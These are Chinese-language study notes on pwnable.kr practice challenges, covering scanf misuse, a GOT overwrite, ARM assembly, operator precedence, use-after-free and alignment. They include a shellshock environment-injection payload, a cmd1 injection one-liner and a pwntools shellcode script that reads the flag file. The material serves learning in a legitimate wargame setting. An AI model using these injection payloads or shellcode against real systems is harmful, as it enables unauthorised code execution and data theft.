

## passcode 

知识点： 
scanf函数输入问题，会把栈上存储内容的地址作为&地址来使用
GOT 复写技术，讲GOT中的偏移写入system地址附近，然后函数在调用下一某个函数（printf，fflush等函数的时候），反正是在这次scanf之后存在的某个函数


	 804858b:    a1 2c a0 04 08           mov    0x804a02c,%eax
	 8048590:    89 04 24                 mov    %eax,(%esp)
	 8048593:    e8 98 fe ff ff           call   8048430 <fflush@plt>
	 8048598:    b8 86 87 04 08           mov    $0x8048786,%eax
	 804859d:    89 04 24                 mov    %eax,(%esp)
	 80485a0:    e8 7b fe ff ff           call   8048420 <printf@plt>

复写printf()函数
http://m.blog.csdn.net/qq_33528164/article/details/70505151

复写fflush函数，同样的方法，讲fflush的GOT表中的地址覆盖成system地址

攻击实现的前提：GOT可改，可以通过函数实现对GOT的改写

如何发现漏洞：编译c文件，往往编译器给的提示就是错误信息

	root@ubuntu:~/Desktop/pwnable_kr/passcode# gcc -o password1 passcode.c
	passcode.c: In function ‘login’:
	passcode.c:9:8: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
	  scanf("%d", passcode1);
	        ^
	passcode.c:14:15: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
	         scanf("%d", passcode2);

可以第二个参数存在问题，需要&取地址符号，没有就导致了scanf把esp开辟的栈空间中的地址当做需要写入的地址来执行，当前会报段错误！！！！

# random 

知识点：rand()随机化在同一主机是不会改变的，gdb一下就可以得到结果


# input2

知识点：对linux文件输入参数的考察，输入的参数包括形参数量，参数本身，环境变量，文件读写，stdio输入输出，pipe管道输入参数等等。

# leg 

知识点：ARM汇编
参考：
http://www.tuicool.com/articles/bERfu2m 相对比较详细
http://blog.csdn.net/qq_19550513/article/details/62044968 
http://blog.csdn.net/lee244868149/article/details/49488575 ARM指针PC相关小问题（学习之）


具体知识点：

其他：
ARM状态此时处理器执行32位的字对齐的ARM指令，Thumb状态此时处理器执行16位的，半字对齐的THUMB指令。 切换程序：从ARM到Thumb: LDR R0,=lable+1 BX R0 从ARM到Thumb: LDR R0,=lable BX R0

key1：

arm汇编是以r0作为函数的返回值的，pc的值为当前地址+8 即0x00008cdc+ 8

key2：
	0x00008d00 <+16>:    bx      r6                                          
	0x00008d04 <+20>:    mov     r3, pc                                      
	0x00008d06 <+22>:    adds    r3, #4   
	......
0x00008d10  <+32>:   mov r0, r3
r6 = 0x00008cfc + 8 +1 = 0x00008d04。 bx r6在r6地址处切换成thumb模式。在thumb模式下pc = 当前地址+4。r0 =r3 = 0x00008d04 +4+4

key3：

	0x00008d28 <+8>:     mov     r3, lr                                        
	0x00008d2c <+12>:    mov     r0, r3
r0等于lr即key3()函数的返回地址0x00008d80。

特殊点：
lr地址的问题：
参考http://blog.csdn.net/lee244868149/article/details/49488575，根据不同的指令，lr地址会变化，

因此得到值为：
0x8ce4+0x8d0c+0x8d80=108400(d)

# mistake

知识点：

	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){

In C, the file descriptor 0 indicates the stdin file stream. Because fd is always 0, read() will copy the content of the stdin stream to pw_buf!
C原因中，<  > 的优先级比=高，因此，这个话永远也是fd=0，当fd=0时，表示从stdio中输入，因此第一个我们可以从标准输入输入一个长度为10的字符串，然后异或后：

	mistake@ubuntu:~$ ./mistake
	do not bruteforce...
	0000000000
	111input password :1111111111
	Password OK
	Mommy, the operator priority always confuses me :(



# shellshock 

CVE-2014-6271 

http://ydc1992.github.io/2016/04/03/Pwnable-kr-shellshock/
http://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/
https://coolshell.cn/articles/11973.html



挖掘该漏洞的方法论： 深入了解bash源码，对bash处理env了如执掌啊

env 环境变量的处理问题，(){ 会被处理成为函数开头，虽然你输入的只是参数，导致代码注入，可以开个反向端口或者shell
一般常用的payload是：

	'(){:;};echo flag'
	':'相当于/bin/true 
    () { :;} 中的冒号就相当于/bin/true，返回true并退出。

构造payload：

    env x='() { :;}; /bin/cat flag' ./shellshock




# coin1 

二分查找，参见代码

关键点：

算法考察，在目标机器运行，否则会很慢，网络延时太大


# balckjack 

对输入参数的大小比较判断，读懂题目


# lotto 

题目考点：

/dev/urandom 产生系统噪声的随机数，通过读这个文件，可以获取随机数。

ascii中0-31（127）是控制字符，其余都是可见字符，再结合题目中说，给出6个小于46的数字，因此把范围缩小到31-46自字段。

目标机器是tmp文件下不可‘ls’命令，但是文件确实存在可以盲打。


# cmd1 

题目考点：

环境变量，通过$符号来获取

通关参数：

cmd1@ubuntu:~$ env x='/bin/cat /home/cmd1/flag' ./cmd1 "\$x"

mommy now I get what PATH environment is for :)

通关密码


类似shellshock漏洞

# uaf 

漏洞：use after free 漏洞

考点： C++ 中虚函数内存排布，C++中堆释放顺序，堆的调用利用顺序，这些都是基础知识。


# memcpy 


参考：https://etenal.me/archives/972#C18

源码：http://pwnable.kr/bin/memcpy.c

https://github.com/Macmod/pwnable-writeups/blob/master/toddlers/memcpy.md
需要加入 8 字节，需要尝试

http://pwdme.cc/2017/04/19/pwnable-kr-toddlers-bottle-3/
这个里面对 int（（x + 4)/8+1），可能是有错误，但是整个数据还是很多

漏洞：需要输入的参数是16字节对齐，因此需要输入的参数是16的倍数。
但是关于对齐还是不是很懂，还需要调试一下，才能明白


# asm 

shellcode编写采用

https://github.com/Macmod/pwnable-writeups/blob/master/toddlers/asm.md

直接用pwntools提供的工具比较简单，加入需要自己手工写shellcode还是可以滴，但是相对比较难而已。
但是作为hacker，这个技能还是得会的。

代码贴出来：

	from pwn import *
	
	con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
	p = con.connect_remote('localhost', 9026)
	context(arch='amd64', os='linux')
	shellcode = ''
	shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
	
	shellcode += shellcraft.open('rsp', 0, 0) #rsp 保存到栈顶
	shellcode += shellcraft.read('rax', 'rsp', 100) #rsp 读出rax的值然后输入到rsp上
	shellcode += shellcraft.write(1, 'rsp', 100) # 
	#linux 0--->stdin,1--->stdout,2--->stderr.write(1,'rsp',100)
	# log.info(shellcode)
	p.recvuntil('shellcode: ')
	print (shellcode+'\n')
	p.send(asm(shellcode))
	log.success(p.recvline())

大家可以打印出来，看看的shellcode具体汇编代码，顺便学习一下汇编shellcode的写法(64位程序的写法)

# 







               ^
